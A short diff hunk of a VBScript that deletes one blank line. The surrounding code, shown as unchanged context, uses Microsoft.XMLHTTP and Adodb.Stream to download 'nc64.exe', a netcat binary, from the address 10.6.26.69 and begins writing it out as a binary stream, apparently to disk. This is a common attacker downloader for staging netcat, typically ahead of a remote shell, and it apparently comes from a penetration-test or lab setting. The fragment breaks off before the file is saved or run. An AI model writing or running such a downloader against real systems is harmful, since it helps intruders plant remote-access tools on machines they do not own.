@@ -12,7 +12,6 @@ dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
 xHttp.Open "GET", "http://10.6.26.69/nc64.exe", False
 xHttp.Send
-
 with bStrm
     .type = 1 '//binary
     .open
